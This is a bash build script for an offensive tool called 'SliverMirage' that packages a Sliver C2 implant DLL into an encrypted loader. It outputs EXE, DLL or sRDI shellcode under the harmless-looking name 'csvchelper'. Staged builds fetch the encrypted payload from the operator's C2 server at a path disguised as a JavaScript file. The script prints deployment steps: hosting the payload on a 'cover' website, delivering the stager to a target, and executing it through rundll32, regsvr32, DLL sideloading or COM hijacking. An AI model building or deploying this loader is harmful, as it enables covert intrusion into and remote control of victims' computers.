#!/usr/bin/env bash
#
# build.sh — end-to-end: DLL → Crystal Palace PICO → loader
#
# Takes a Sliver implant DLL, wraps it through Crystal Palace, encrypts
# the PICO, and compiles a loader in the chosen format.
#
# Formats:
#   exe              (default) — staged EXE, downloads encrypted PICO via HTTPS at runtime
#   exe-stageless             — stageless EXE, encrypted PICO embedded at compile time
#   dll                       — stageless DLL, encrypted PICO embedded at compile time
#   dll-staged                — staged DLL, downloads encrypted PICO via HTTPS at runtime
#   shellcode                 — staged shellcode (sRDI from staged DLL), needs --host
#   shellcode-stageless       — stageless shellcode (sRDI from stageless DLL)
#
# Auto-provisions missing dependencies:
#   - Temurin JDK 17 (if wrong java version)
#   - Crystal Palace distribution (if not found)
#   - apt packages: mingw-w64, nasm, make, python3, openssl
#
# Usage:
#   ./build.sh --dll <path.dll> --host <ip> [--port 443] [--path /assets/js/vendor.js]
#   ./build.sh --dll <path.dll> --format exe-stageless
#   ./build.sh --dll <path.dll> --format dll
#   ./build.sh --dll <path.dll> --format dll-staged --host <ip>
#   ./build.sh --dll <path.dll> --format shellcode --host <ip>
#   ./build.sh --dll <path.dll> --format shellcode-stageless
#
# Outputs (exe):
#   build/csvchelper.exe  — single stager (~20 KB), deliver to target
#   build/payload.dat     — encrypted PICO, upload to Sliver website (NOT to target)
#
# Outputs (dll / dll-staged):
#   build/csvchelper.dll  — DLL (stageless or staged ~20 KB)
#   build/payload.dat     — staged only: upload to Sliver website
#
# Outputs (shellcode / shellcode-stageless):
#   build/csvchelper.bin  — position-independent shellcode (sRDI)
#   build/payload.dat     — staged only: upload to Sliver website

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# ── Defaults ─────────────────────────────────────────────────────────────────

DLL=""
HOST=""
PORT=443
URL_PATH="/assets/js/vendor.js"
FORMAT="exe"
EXPORT=""
TEMURIN_VERSION="17.0.13+11"
TEMURIN_DIR="/opt/jdk-${TEMURIN_VERSION}"
LOADER_DIR="$SCRIPT_DIR/loader"
LIBTCG="$SCRIPT_DIR/libtcg.x64.zip"

# ── Parse args ───────────────────────────────────────────────────────────────

usage() {
    cat <<EOF
Usage: $0 --dll <path.dll> --host <ip> [options]
       $0 --dll <path.dll> --format dll
       $0 --dll <path.dll> --format shellcode --host <ip>

Required:
  --dll     <path>    Sliver implant DLL (--format shared)
  --host    <ip>      C2 server IP (required for staged formats)

Optional:
  --format  <fmt>     exe (default), exe-stageless, dll, dll-staged, shellcode, shellcode-stageless
  --port    <port>    C2 port (default: 443, staged formats only)
  --path    <path>    URL path for payload download (default: /assets/js/vendor.js, staged only)
  --export  <name>    Add custom DLL export name (e.g. VoidFunc) — DLL/shellcode formats only

Environment:
  CRYSTAL_PALACE_HOME   Path to Crystal Palace dist (auto-provisioned if missing)

Example:
  $0 --dll /tmp/prod.dll --host 192.168.164.131
  $0 --dll /tmp/prod.dll --format exe-stageless
  $0 --dll /tmp/prod.dll --format dll
  $0 --dll /tmp/prod.dll --format dll-staged --host 192.168.1.63
  $0 --dll /tmp/prod.dll --format shellcode --host 192.168.1.63
  $0 --dll /tmp/prod.dll --format shellcode-stageless
  $0 --dll /tmp/prod.dll --format dll-staged --host 192.168.1.63 --export VoidFunc
EOF
    exit 2
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --dll)    DLL="$2";      shift 2;;
        --host)   HOST="$2";     shift 2;;
        --port)   PORT="$2";     shift 2;;
        --path)   URL_PATH="$2"; shift 2;;
        --format) FORMAT="$2";   shift 2;;
        --export) EXPORT="$2";  shift 2;;
        -h|--help) usage;;
        *) echo -e "${RED}error: unknown option: $1${NC}" >&2; usage;;
    esac
done

[[ -z "$DLL" ]]  && { echo -e "${RED}error: --dll is required${NC}" >&2; usage; }
[[ ! -f "$DLL" ]] && { echo -e "${RED}error: DLL not found: $DLL${NC}" >&2; exit 2; }

case "$FORMAT" in
    exe|exe-stageless|dll|dll-staged|shellcode|shellcode-stageless) ;;
    *) echo -e "${RED}error: --format must be exe, exe-stageless, dll, dll-staged, shellcode, or shellcode-stageless${NC}" >&2; usage;;
esac

if [[ ("$FORMAT" == "exe" || "$FORMAT" == "dll-staged" || "$FORMAT" == "shellcode") && -z "$HOST" ]]; then
    echo -e "${RED}error: --host is required for $FORMAT format${NC}" >&2; usage
fi

# ── Auto-provision helpers ──────────────────────────────────────────────────

install_apt_packages() {
    local TO_INSTALL=()
    for pkg in mingw-w64 nasm make python3 openssl curl git; do
        if ! dpkg -s "$pkg" &>/dev/null; then
            TO_INSTALL+=("$pkg")
        fi
    done
    if [[ ${#TO_INSTALL[@]} -gt 0 ]]; then
        echo -e "${CYAN}[auto] Installing apt packages: ${TO_INSTALL[*]}${NC}"
        sudo apt-get update -qq
        sudo apt-get install -y -qq "${TO_INSTALL[@]}"
    fi
}

install_java17() {
    if [[ -d "$TEMURIN_DIR" ]]; then
        echo -e "  ${GREEN}✓${NC} Temurin JDK 17 already at $TEMURIN_DIR"
        return 0
    fi

    local TARBALL="OpenJDK17U-jdk_x64_linux_hotspot_${TEMURIN_VERSION/+/_}.tar.gz"
    local URL="https://github.com/adoptium/temurin17-binaries/releases/download/jdk-${TEMURIN_VERSION/+/%2B}/${TARBALL}"

    echo -e "${CYAN}[auto] Downloading Temurin JDK 17...${NC}"
    curl -fsSL -o "/tmp/$TARBALL" "$URL"
    echo -e "${CYAN}[auto] Installing to $TEMURIN_DIR...${NC}"
    sudo tar -xzf "/tmp/$TARBALL" -C /opt
    rm -f "/tmp/$TARBALL"
    echo -e "  ${GREEN}✓${NC} Temurin JDK 17 installed"
}

setup_crystal_palace() {
    local CP_DIR="$SCRIPT_DIR/external/crystalpalace"

    if [[ -n "${CRYSTAL_PALACE_HOME:-}" && -x "$CRYSTAL_PALACE_HOME/link" ]]; then
        return 0
    fi

    if [[ -x "$CP_DIR/crystalpalace/link" ]]; then
        export CRYSTAL_PALACE_HOME="$CP_DIR/crystalpalace"
        return 0
    fi

    echo -e "${CYAN}[auto] Downloading Crystal Palace distribution...${NC}"
    mkdir -p "$CP_DIR"
    curl -fsSL https://tradecraftgarden.org/download/cpdist-latest.tgz | tar xz -C "$CP_DIR"

    if [[ ! -d "$CP_DIR/crystalpalace" ]]; then
        echo -e "${RED}error: Crystal Palace archive did not extract as expected${NC}" >&2
        exit 2
    fi

    echo -e "${CYAN}[auto] Creating 'link' wrapper...${NC}"
    cat > "$CP_DIR/crystalpalace/link" << 'LINKEOF'
#!/usr/bin/env bash
java -jar "${BASH_SOURCE%/*}/crystalpalace.jar" link "$@"
LINKEOF
    chmod +x "$CP_DIR/crystalpalace/link"

    export CRYSTAL_PALACE_HOME="$CP_DIR/crystalpalace"
    echo -e "  ${GREEN}✓${NC} Crystal Palace installed at $CRYSTAL_PALACE_HOME"
}

# ── Auto-provision ──────────────────────────────────────────────────────────

echo ""
echo -e "${CYAN}[*] Checking and provisioning dependencies...${NC}"

install_apt_packages

# Java 17
JAVA_VER=""
if command -v java &>/dev/null; then
    JAVA_VER=$(java -version 2>&1 | head -1 | grep -oP '"(\d+)' | tr -d '"')
fi

if [[ "$JAVA_VER" != "17" ]]; then
    if [[ -d "$TEMURIN_DIR" ]]; then
        echo -e "  ${YELLOW}⚠${NC} System java = ${JAVA_VER:-missing}, using Temurin 17 at $TEMURIN_DIR"
    else
        install_java17
    fi
    export JAVA_HOME="$TEMURIN_DIR"
    export PATH="$JAVA_HOME/bin:$PATH"
fi

# Crystal Palace
setup_crystal_palace

# ── Final dependency validation ─────────────────────────────────────────────

echo ""
echo -e "${CYAN}[*] Validating...${NC}"

MISSING=()

for cmd in x86_64-w64-mingw32-gcc x86_64-w64-mingw32-windres nasm make python3 openssl java; do
    if command -v "$cmd" &>/dev/null; then
        echo -e "  ${GREEN}✓${NC} $cmd"
    else
        echo -e "  ${RED}✗${NC} $cmd"
        MISSING+=("$cmd")
    fi
done

JAVA_VER=$(java -version 2>&1 | head -1 | grep -oP '"(\d+)' | tr -d '"')
if [[ "$JAVA_VER" == "17" ]]; then
    echo -e "  ${GREEN}✓${NC} java version = 17"
else
    echo -e "  ${RED}✗${NC} java version = $JAVA_VER (need 17)"
    MISSING+=("java-17")
fi

if [[ -z "${CRYSTAL_PALACE_HOME:-}" || ! -x "$CRYSTAL_PALACE_HOME/link" ]]; then
    echo -e "  ${RED}✗${NC} Crystal Palace"; MISSING+=("CRYSTAL_PALACE_HOME")
else
    echo -e "  ${GREEN}✓${NC} Crystal Palace: $CRYSTAL_PALACE_HOME"
fi

if [[ -d "$LOADER_DIR/src" ]]; then
    echo -e "  ${GREEN}✓${NC} loader/"
else
    echo -e "  ${RED}✗${NC} loader/"; MISSING+=("loader")
fi

if [[ -f "$LIBTCG" ]]; then
    echo -e "  ${GREEN}✓${NC} libtcg.x64.zip"
else
    echo -e "  ${RED}✗${NC} libtcg.x64.zip"; MISSING+=("libtcg.x64.zip")
fi

for f in Makefile src/stager_remote.c scripts/gen_payload.py resources/resource.rc resources/manifest.xml; do
    if [[ ! -f "$SCRIPT_DIR/$f" ]]; then
        echo -e "  ${RED}✗${NC} $f"; MISSING+=("$f")
    fi
done

if [[ ${#MISSING[@]} -gt 0 ]]; then
    echo ""
    echo -e "${RED}✗ Missing ${#MISSING[@]} dependencies: ${MISSING[*]}${NC}"
    echo -e "${RED}  Could not auto-provision. Fix manually and re-run.${NC}"
    exit 2
fi

echo -e "  ${GREEN}All dependencies OK${NC}"

# ── Resolve paths ────────────────────────────────────────────────────────────

DLL_ABS="$(cd "$(dirname "$DLL")" && pwd)/$(basename "$DLL")"
DLL_SIZE=$(wc -c < "$DLL_ABS")
BUILD_DIR="$SCRIPT_DIR/build"
PICO_BIN="$BUILD_DIR/implant.crystal.bin"

mkdir -p "$BUILD_DIR"

if [[ "$FORMAT" == "exe" ]]; then
    echo ""
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║  SliverMirage — Remote PICO Loader Build (staged EXE)     ║"
    echo "  ╠═══════════════════════════════════════════════════════════╣"
    echo "  ║  DLL:    $DLL_ABS"
    echo "  ║          ($DLL_SIZE bytes)"
    echo "  ║  C2:     https://$HOST:$PORT$URL_PATH"
    echo "  ║  Output: $BUILD_DIR/csvchelper.exe"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
elif [[ "$FORMAT" == "exe-stageless" ]]; then
    echo ""
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║  SliverMirage — Stageless EXE Build (embedded payload)   ║"
    echo "  ╠═══════════════════════════════════════════════════════════╣"
    echo "  ║  DLL:    $DLL_ABS"
    echo "  ║          ($DLL_SIZE bytes)"
    echo "  ║  Output: $BUILD_DIR/csvchelper_stageless.exe"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
elif [[ "$FORMAT" == "dll-staged" ]]; then
    echo ""
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║  SliverMirage — Staged DLL Build (HTTPS download)       ║"
    echo "  ╠═══════════════════════════════════════════════════════════╣"
    echo "  ║  DLL:    $DLL_ABS"
    echo "  ║          ($DLL_SIZE bytes)"
    echo "  ║  C2:     https://$HOST:$PORT$URL_PATH"
    echo "  ║  Output: $BUILD_DIR/csvchelper.dll"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
elif [[ "$FORMAT" == "shellcode" ]]; then
    echo ""
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║  SliverMirage — Staged Shellcode (sRDI)                 ║"
    echo "  ╠═══════════════════════════════════════════════════════════╣"
    echo "  ║  DLL:    $DLL_ABS"
    echo "  ║          ($DLL_SIZE bytes)"
    echo "  ║  C2:     https://$HOST:$PORT$URL_PATH"
    echo "  ║  Output: $BUILD_DIR/csvchelper.bin"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
elif [[ "$FORMAT" == "shellcode-stageless" ]]; then
    echo ""
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║  SliverMirage — Stageless Shellcode (sRDI)              ║"
    echo "  ╠═══════════════════════════════════════════════════════════╣"
    echo "  ║  DLL:    $DLL_ABS"
    echo "  ║          ($DLL_SIZE bytes)"
    echo "  ║  Output: $BUILD_DIR/csvchelper.bin"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
else
    echo ""
    echo "  ╔═══════════════════════════════════════════════════════════╗"
    echo "  ║  SliverMirage — Stageless DLL Build                     ║"
    echo "  ╠═══════════════════════════════════════════════════════════╣"
    echo "  ║  DLL:    $DLL_ABS"
    echo "  ║          ($DLL_SIZE bytes)"
    echo "  ║  Output: $BUILD_DIR/csvchelper.dll"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
fi
echo ""

# ── Step 1: Wrap DLL into Crystal Palace PICO ────────────────────────────────

echo -e "${CYAN}[1/3] Wrapping DLL through Crystal Palace...${NC}"

echo "[*] Using pre-built DLL: $DLL_ABS"

if [[ ! -x "$CRYSTAL_PALACE_HOME/link" ]]; then
    echo -e "${RED}error: 'link' wrapper not executable at $CRYSTAL_PALACE_HOME/link${NC}" >&2
    exit 2
fi

echo "[*] Building loader objects..."
make -C "$LOADER_DIR" all

echo "[*] Running Crystal Palace linker..."
cd "$LOADER_DIR"
"$CRYSTAL_PALACE_HOME/link" \
    loader.spec \
    "$DLL_ABS" \
    "$PICO_BIN"
cd "$SCRIPT_DIR"

PICO_SIZE=$(wc -c < "$PICO_BIN")
echo -e "      PICO: $PICO_BIN ($PICO_SIZE bytes)"
echo ""

# ── Step 2: Encrypt PICO + compile loader ────────────────────────────────────

if [[ "$FORMAT" == "exe" ]]; then
    echo -e "${CYAN}[2/3] Encrypting PICO + compiling remote stager...${NC}"
    make -C "$SCRIPT_DIR" \
        PICO="$(cd "$(dirname "$PICO_BIN")" && pwd)/$(basename "$PICO_BIN")" \
        C2_HOST="$HOST" \
        C2_PORT="$PORT" \
        C2_PATH="$URL_PATH"
elif [[ "$FORMAT" == "exe-stageless" ]]; then
    echo -e "${CYAN}[2/3] Encrypting + embedding PICO into stageless EXE...${NC}"
    make -C "$SCRIPT_DIR" exe-stageless \
        PICO="$(cd "$(dirname "$PICO_BIN")" && pwd)/$(basename "$PICO_BIN")"
elif [[ "$FORMAT" == "dll-staged" ]]; then
    echo -e "${CYAN}[2/3] Encrypting PICO + compiling staged DLL...${NC}"
    make -C "$SCRIPT_DIR" dll-staged \
        PICO="$(cd "$(dirname "$PICO_BIN")" && pwd)/$(basename "$PICO_BIN")" \
        C2_HOST="$HOST" \
        C2_PORT="$PORT" \
        C2_PATH="$URL_PATH" \
        EXPORT="$EXPORT"
elif [[ "$FORMAT" == "shellcode" ]]; then
    echo -e "${CYAN}[2/3] Encrypting PICO + building staged shellcode (sRDI)...${NC}"
    make -C "$SCRIPT_DIR" shellcode \
        PICO="$(cd "$(dirname "$PICO_BIN")" && pwd)/$(basename "$PICO_BIN")" \
        C2_HOST="$HOST" \
        C2_PORT="$PORT" \
        C2_PATH="$URL_PATH" \
        EXPORT="$EXPORT"
elif [[ "$FORMAT" == "shellcode-stageless" ]]; then
    echo -e "${CYAN}[2/3] Encrypting + embedding PICO into stageless shellcode (sRDI)...${NC}"
    make -C "$SCRIPT_DIR" shellcode-stageless \
        PICO="$(cd "$(dirname "$PICO_BIN")" && pwd)/$(basename "$PICO_BIN")" \
        EXPORT="$EXPORT"
else
    echo -e "${CYAN}[2/3] Encrypting + embedding PICO into stageless DLL...${NC}"
    make -C "$SCRIPT_DIR" dll \
        PICO="$(cd "$(dirname "$PICO_BIN")" && pwd)/$(basename "$PICO_BIN")" \
        EXPORT="$EXPORT"
fi

echo ""

# ── Step 3: Print deployment instructions ────────────────────────────────────

echo -e "${GREEN}[3/3] Build complete!${NC}"
echo ""

if [[ "$FORMAT" == "exe" ]]; then
    EXE_ABS="$BUILD_DIR/csvchelper.exe"
    DAT_ABS="$BUILD_DIR/payload.dat"
    EXE_SIZE=$(wc -c < "$EXE_ABS")
    DAT_SIZE=$(wc -c < "$DAT_ABS")

    echo "  ┌─────────────────────────────────────────────────────────────┐"
    echo "  │  DEPLOY (staged EXE)                                       │"
    echo "  ├─────────────────────────────────────────────────────────────┤"
    echo "  │                                                             │"
    echo "  │  Step 1: Upload payload to Sliver website                   │"
    echo "  │                                                             │"
    echo "  │    sliver > websites add-content --website cover \\          │"
    echo "  │      --web-path $URL_PATH \\"
    echo "  │      --content-type application/javascript \\                │"
    echo "  │      --content $DAT_ABS"
    echo "  │                                                             │"
    echo "  │  Step 2: Deliver to target                                  │"
    echo "  │                                                             │"
    echo -e "  │    ${GREEN}ONLY this file${NC}: $EXE_ABS"
    echo "  │    ($EXE_SIZE bytes)"
    echo "  │                                                             │"
    echo "  │  payload.dat ($DAT_SIZE bytes) stays on YOUR machine        │"
    echo "  │  Target downloads it via HTTPS at runtime                   │"
    echo "  └─────────────────────────────────────────────────────────────┘"
elif [[ "$FORMAT" == "exe-stageless" ]]; then
    EXE_ABS="$BUILD_DIR/csvchelper_stageless.exe"
    EXE_SIZE=$(wc -c < "$EXE_ABS")

    echo "  ┌─────────────────────────────────────────────────────────────┐"
    echo "  │  DEPLOY (stageless EXE)                                     │"
    echo "  ├─────────────────────────────────────────────────────────────┤"
    echo "  │                                                             │"
    echo "  │  Single file — no C2 download needed at runtime.            │"
    echo "  │                                                             │"
    echo -e "  │  ${GREEN}Deliver${NC}: $EXE_ABS"
    echo "  │  ($EXE_SIZE bytes)"
    echo "  │                                                             │"
    echo "  │  Execute directly or via DLL sideloading (python.exe).      │"
    echo "  └─────────────────────────────────────────────────────────────┘"
elif [[ "$FORMAT" == "dll-staged" ]]; then
    DLL_OUT_ABS="$BUILD_DIR/csvchelper.dll"
    DAT_ABS="$BUILD_DIR/payload.dat"
    DLL_OUT_SIZE=$(wc -c < "$DLL_OUT_ABS")
    DAT_SIZE=$(wc -c < "$DAT_ABS")

    echo "  ┌─────────────────────────────────────────────────────────────┐"
    echo "  │  DEPLOY (staged DLL)                                        │"
    echo "  ├─────────────────────────────────────────────────────────────┤"
    echo "  │                                                             │"
    echo "  │  Step 1: Upload payload to Sliver website                   │"
    echo "  │                                                             │"
    echo "  │    sliver > websites add-content --website cover \\          │"
    echo "  │      --web-path $URL_PATH \\"
    echo "  │      --content-type application/javascript \\                │"
    echo "  │      --content $DAT_ABS"
    echo "  │                                                             │"
    echo "  │  Step 2: Deliver to target                                  │"
    echo "  │                                                             │"
    echo -e "  │    ${GREEN}ONLY this file${NC}: $DLL_OUT_ABS"
    echo "  │    ($DLL_OUT_SIZE bytes)"
    echo "  │                                                             │"
    echo "  │  payload.dat ($DAT_SIZE bytes) stays on YOUR machine        │"
    echo "  │  Target downloads it via HTTPS at runtime                   │"
    echo "  │                                                             │"
    echo "  │  Execution methods:                                         │"
    echo "  │    rundll32 csvchelper.dll,StartW                            │"
    echo "  │    regsvr32 /s csvchelper.dll                                │"
    echo "  │    DLL sideloading (rename to target DLL name)               │"
    echo "  │    COM hijack (register CLSID → InprocServer32)              │"
    echo "  └─────────────────────────────────────────────────────────────┘"
elif [[ "$FORMAT" == "shellcode" ]]; then
    SC_ABS="$BUILD_DIR/csvchelper.bin"
    DAT_ABS="$BUILD_DIR/payload.dat"
    SC_SIZE=$(wc -c < "$SC_ABS")
    DAT_SIZE=$(wc -c < "$DAT_ABS")

    echo "  ┌─────────────────────────────────────────────────────────────┐"
    echo "  │  DEPLOY (staged shellcode)                                   │"
    echo "  ├─────────────────────────────────────────────────────────────┤"
    echo "  │                                                             │"
    echo "  │  Step 1: Upload payload to Sliver website                   │"
    echo "  │                                                             │"
    echo "  │    sliver > websites add-content --website cover \\          │"
    echo "  │      --web-path $URL_PATH \\"
    echo "  │      --content-type application/javascript \\                │"
    echo "  │      --content $DAT_ABS"
    echo "  │                                                             │"
    echo "  │  Step 2: Use your loader to inject the shellcode             │"
    echo "  │                                                             │"
    echo -e "  │    ${GREEN}Shellcode${NC}: $SC_ABS"
    echo "  │    ($SC_SIZE bytes)"
    echo "  │                                                             │"
    echo "  │  sRDI: reflective DLL load → DllMain → HTTPS download       │"
    echo "  │  payload.dat ($DAT_SIZE bytes) stays on YOUR machine        │"
    echo "  └─────────────────────────────────────────────────────────────┘"
elif [[ "$FORMAT" == "shellcode-stageless" ]]; then
    SC_ABS="$BUILD_DIR/csvchelper.bin"
    SC_SIZE=$(wc -c < "$SC_ABS")

    echo "  ┌─────────────────────────────────────────────────────────────┐"
    echo "  │  DEPLOY (stageless shellcode)                                │"
    echo "  ├─────────────────────────────────────────────────────────────┤"
    echo "  │                                                             │"
    echo "  │  Self-contained — no C2 download at runtime.                │"
    echo "  │  Use your loader to inject the shellcode.                   │"
    echo "  │                                                             │"
    echo -e "  │    ${GREEN}Shellcode${NC}: $SC_ABS"
    echo "  │    ($SC_SIZE bytes)"
    echo "  │                                                             │"
    echo "  │  sRDI: reflective DLL load → DllMain → decrypt → execute    │"
    echo "  └─────────────────────────────────────────────────────────────┘"
else
    DLL_OUT_ABS="$BUILD_DIR/csvchelper.dll"
    DLL_OUT_SIZE=$(wc -c < "$DLL_OUT_ABS")

    echo "  ┌─────────────────────────────────────────────────────────────┐"
    echo "  │  DEPLOY (stageless DLL)                                     │"
    echo "  ├─────────────────────────────────────────────────────────────┤"
    echo "  │                                                             │"
    echo "  │  Single file — no C2 download needed at runtime.            │"
    echo "  │                                                             │"
    echo -e "  │  ${GREEN}Deliver${NC}: $DLL_OUT_ABS"
    echo "  │  ($DLL_OUT_SIZE bytes)"
    echo "  │                                                             │"
    echo "  │  Execution methods:                                         │"
    echo "  │    rundll32 csvchelper.dll,StartW                            │"
    echo "  │    regsvr32 /s csvchelper.dll                                │"
    echo "  │    DLL sideloading (rename to target DLL name)               │"
    echo "  │    COM hijack (register CLSID → InprocServer32)              │"
    echo "  └─────────────────────────────────────────────────────────────┘"
fi
echo ""
